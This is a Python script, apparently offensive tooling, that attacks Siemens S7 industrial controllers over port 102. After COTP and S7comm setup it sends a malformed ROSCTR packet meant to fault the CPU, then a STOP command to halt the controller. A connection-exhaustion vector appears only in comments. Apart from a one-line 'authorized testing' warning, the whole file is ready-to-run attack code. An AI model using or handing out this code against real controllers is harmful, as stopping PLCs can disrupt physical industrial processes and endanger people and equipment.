def s7_dos_attack(target_ip):
    """
    Multiple DoS techniques for S7 PLCs
    CVE-2020-15368: Malformed ROSCTR causes CPU fault
    """
    import socket
    import struct

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, 102))

    # COTP Connection
    cotp_cr = bytes.fromhex('0300001611e0000000010000c00100c10200c20200')
    sock.send(cotp_cr)
    sock.recv(1024)

    # S7comm Setup
    s7_setup = bytes.fromhex('0300001902f08032010000000000080000f0000001000100f0')
    sock.send(s7_setup)
    sock.recv(1024)

    # DoS Vector 1: Malformed ROSCTR
    # ROSCTR byte at offset 1 in S7comm header
    # Valid: 0x01 (Job), 0x03 (Ack-Data)
    # Invalid: 0xFF causes crash on some firmware versions
    malformed = bytes.fromhex('0300001902f080FF010000000000080000f0000001000100f0')
    sock.send(malformed)

    # DoS Vector 2: Excessive connection attempts
    # Exhausts PLC connection table (typically 4-8 connections)

    # DoS Vector 3: PLC STOP command (graceful shutdown)
    s7_stop = bytes.fromhex('0300002102f080320700000000000800080001120411440100ff09005f5045')
    sock.send(s7_stop)

    sock.close()
    print("[+] DoS payload sent")

# WARNING: Use only in authorized testing
# s7_dos_attack('192.168.1.100')
